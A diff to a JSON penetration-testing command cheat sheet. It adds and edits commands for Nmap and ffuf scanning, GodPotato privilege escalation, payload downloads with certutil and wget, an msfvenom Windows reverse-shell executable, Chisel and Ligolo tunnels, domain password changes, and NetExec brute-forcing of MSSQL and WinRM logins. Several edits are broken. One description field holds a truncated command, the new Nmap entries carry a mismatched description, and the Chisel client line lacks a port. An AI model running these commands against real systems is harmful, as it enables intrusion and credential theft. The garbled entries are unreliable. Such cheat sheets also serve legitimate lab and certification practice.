@@ -12,7 +12,17 @@
     },
     {
       "os": "Linux",
-      "cmd": "nmap -sC -sV {RHOST}",
+      "cmd": "nmap -sC -sV -v {RHOST} -oN nmap_scan",
+      "description": "Perform a comprehensive Nmap scan (default scripts and service version detection) on the target host."
+    },
+    {
+      "os": "Linux",
+      "cmd": "nmap -p- {RHOST} -oN nmap_full_scan",
+      "description": "Perform a comprehensive Nmap scan (default scripts and service version detection) on the target host."
+    },
+    {
+      "os": "Linux",
+      "cmd": "sudo nmap -sU {RHOST} -oN nmap_UDP_scan",
       "description": "Perform a comprehensive Nmap scan (default scripts and service version detection) on the target host."
     },
     {
@@ -22,14 +32,14 @@
     },
     {
       "os": "Linux",
-      "cmd": "ffuf -u {URL_FUZZ_POINT} -w {WORDLIST_PATH} -fs {FILTER_SIZE}",
-      "description": "Perform directory/file brute-forcing with ffuf, fuzzing a URL with a wordlist and filtering by response size. Use 'FUZZ' keyword in {URL_FUZZ_POINT} for insertion."
+      "cmd": "ffuf -u {RHOST} -w /usr/share/wordlist/dirbuster/raft-large-words.txt -fc 304",
+      "description": "Perform directory/file brute-forcing with ffuf, fuzzing a URL with a wordlist. Use 'FUZZ' keyword in {RHOST} for insertion. Additional filtering options can be added as needed."
     }
   ],
   "privilege_escalation": [
     {
       "os": "Windows",
-      "cmd": ".\\GodPotato-NET4.exe -cmd \"cmd /c net user {USER} {NEW_PASS}\"",
+      "cmd": ".\GodPotato-NET4.exe -cmd \"cmd /c net user {USER} {NEW_PASS}\"",
       "description": "Execute the GodPotato-NET4.exe tool to change a target user's password with elevated privileges."
     },
     {
@@ -51,19 +61,19 @@
   "file_transfer": [
     {
       "os": "Windows",
-      "cmd": "wget http://{LOCAL_IP}/{FILE} -o {FILE}",
+      "cmd": "wget http://{LHOST}/{FILE} -o {FILE}",
       "description": "Download a file (e.g., a payload or tool) from a local web server and save it."
     },
     {
       "os": "Windows",
-      "cmd": "certutil -urlcache -f http://{LOCAL_IP}:{LPORT}/{FILE} {FILE}",
+      "cmd": "certutil -urlcache -f http://{LHOST}:{LPORT}/{FILE} {FILE}",
       "description": "Download a file using certutil from a specified HTTP server (e.g., for transferring tools)."
     }
   ],
   "remote_access_and_lateral_movement": [
     {
       "os": "Windows",
-      "cmd": "msfvenom --payload windows/shell_reverse_tcp LHOST={LOCAL_IP} LPORT={LPORT} -f exe > {OUTPUT_FILE}",
+      "cmd": "msfvenom --payload windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > {FILE}",
       "description": "Generate a Windows reverse TCP shell executable that connects back to your IP and listening port."
     },
     {
@@ -80,24 +90,24 @@
   "tunneling_and_port_forwarding": [
     {
       "os": "Linux",
-      "cmd": "./agent.exe -connect {LOCAL_IP}:{LPORT} -ignore-cert",
+      "cmd": "./agent.exe -connect {LHOST}:11601 -ignore-cert",
       "description": "Connect a Ligolo agent to a Ligolo proxy server at a specified IP and local listening port, ignoring TLS certificate validation."
     },
     {
       "os": "Linux",
-      "cmd": "chisel server -v -p {LPORT} --reverse",
+      "cmd": "chisel server -v -p 8000 --reverse",
       "description": "Start a Chisel server with verbose output, listening on a specific local port and enabling reverse forwarding for clients."
     },
     {
       "os": "Windows",
-      "cmd": ".\\chisel.exe client -v {RHOST_SERVER}:{RPORT_SERVER} R:{LPORT}:{REMOTE_IP}:{RPORT}",
-      "description": "Connect a Chisel client to a server and set up a reverse port forward from a local port to a remote IP and port."
+      "cmd": ".\chisel.exe client -v {LHOST}: R:{LPORT}:{RHOST}:{RPORT}",
+      "description": ".\chisel.exe client -v {LHOST}: R:3306:127.0.0.1:{"
     }
   ],
   "credential_and_ad_management": [
     {
       "os": "Windows",
-      "cmd": "net rpc password {USER} '{NEW_PASS}' -U {DOMAIN}/{ADMIN_USER}%'{ADMIN_PASS}' -S {RHOST}",
+      "cmd": "net rpc password {USER} '{NEW_PASS}' -U {DOMAIN}/{USER}%'{PASS}' -S {RHOST}",
       "description": "Change a user's password via Net RPC on a domain controller, authenticating with administrator credentials."
     },
     {
@@ -129,18 +139,18 @@
     },
     {
       "os": "Linux",
-      "cmd": "nxc mssql {RHOST} -u {USERNAME_FILE} -p {PASSWORD_FILE} --continue-on-success",
-      "description": "Perform MSSQL credential brute-force/enumeration using NetExec against a target host, reading credentials from files and continuing on success."
+      "cmd": "nxc mssql {RHOST} -u users.txt -p pass.txt --continue-on-success",
+      "description": "Perform MSSQL credential brute-force/enumeration using NetExec against a target host, reading credentials from 'users.txt' and 'pass.txt' and continuing on success."
     },
     {
       "os": "Linux",
-      "cmd": "nxc winrm {RHOST} -u {USERNAME_FILE} -p {PASSWORD_FILE} --continue-on-success",
-      "description": "Perform WinRM credential brute-force/enumeration using NetExec against a target host, reading credentials from files and continuing on success."
+      "cmd": "nxc winrm {RHOST} -u users.txt -p pass.txt --continue-on-success",
+      "description": "Perform WinRM credential brute-force/enumeration using NetExec against a target host, reading credentials from 'users.txt' and 'pass.txt' and continuing on success."
     },
     {
       "os": "Linux",
-      "cmd": "nxc winrm {RHOST} -u {USERNAME_FILE} -p {PASSWORD_FILE} --local-auth --continue-on-success",
-      "description": "Perform WinRM local credential brute-force/enumeration using NetExec against a target host, reading credentials from files and continuing on success."
+      "cmd": "nxc winrm {RHOST} -u users.txt -p pass.txt --local-auth --continue-on-success",
+      "description": "Perform WinRM local credential brute-force/enumeration using NetExec against a target host, reading credentials from 'users.txt' and 'pass.txt' and continuing on success."
     }
   ],
   "miscellaneous_system_control": [
